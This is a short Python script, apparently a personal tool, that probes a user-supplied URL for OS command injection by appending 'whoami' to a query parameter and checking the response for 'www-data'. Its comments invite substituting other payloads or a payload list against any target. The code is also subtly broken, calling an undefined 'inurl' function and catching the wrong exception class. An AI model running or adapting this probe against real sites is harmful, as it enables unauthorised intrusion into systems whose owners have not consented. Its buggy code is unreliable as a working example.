# Author : Emre Aslan
# Twitter: twitter.com/aslanewre  
# Github : github.com/aslanemre

import requests

print("""
###############################
#                             #
# OS COMMAND INJECTION TESTER #
#                             #
###############################
""")

# enter the url like this subdomain.domain.tld/path/document.extension?parameter=
url = inurl("[ + ] Enter the target url : ")

target = str(url)+"whoami" # you can define any payload here. Or you can give a payload list.

try:
    results = requests.get(url=target)
    if "www-data" in str(results.text):
        print("[ + ] OS Command Injection Successfully!")
    else:
        print("[ ! ] Nothing Found!")
except ConnectionError:
    print("[ ! ] Connection Error. Try Again.")